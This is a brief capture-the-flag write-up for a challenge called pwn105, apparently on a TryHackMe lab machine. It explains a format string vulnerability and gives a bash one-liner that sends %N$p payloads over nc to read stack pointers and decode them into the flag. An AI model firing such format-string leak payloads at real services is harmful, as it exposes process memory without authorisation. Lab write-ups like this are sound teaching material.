# pwn105

a format string vulnerability, with the flag hidden inside pointers on the stack. a single bash loop can extract these (in positions 6 though 11), convert them to ascii, reverse them and stitch it together to get the flag:

```
current_thmip=10.10.134.184
(for i in {11..6..-1}; do echo \%$i\$p | nc $current_thmip 9006; done) | grep Thanks | cut -c 8- | xxd -ps -r | rev
```
